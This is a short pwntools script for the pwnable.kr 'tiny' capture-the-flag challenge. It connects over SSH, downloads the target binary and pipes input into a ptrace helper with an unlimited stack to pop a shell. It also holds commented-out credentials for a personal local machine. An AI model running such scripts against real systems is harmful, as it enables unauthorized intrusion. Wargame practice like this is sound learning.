from pwn import *
context(os='linux',arch='i386')

s = ssh(host="pwnable.kr", user="tiny", port=2222, password="guest")
#s = ssh(host="127.0.0.1",user="zr33",port=22,password="zhongrui")
s.download_file("/home/tiny/tiny")
working_dir = '/tmp/w00t_tiny/' # specific working dir
s.run("mkdir {0}".format(working_dir)) #mkdir
s.set_working_directory(working_dir)
#s.upload_file('ptrace.c') # upload our ptrace.c
#s.run("gcc ptrace.c -o ptrace -m32") # compile it
#s.run("ln -s /home/tiny/tiny ./tiny") # make symbolic link
# set context

sh = s.shell('/bin/sh')
#sh.sendline('cd {0}'.format(working_dir));
sh.sendline('ulimit -s unlimited')
sh.sendline("(cat) | ./ptrace;")
print "BANG!!! SHELLLL"

sh.interactive()
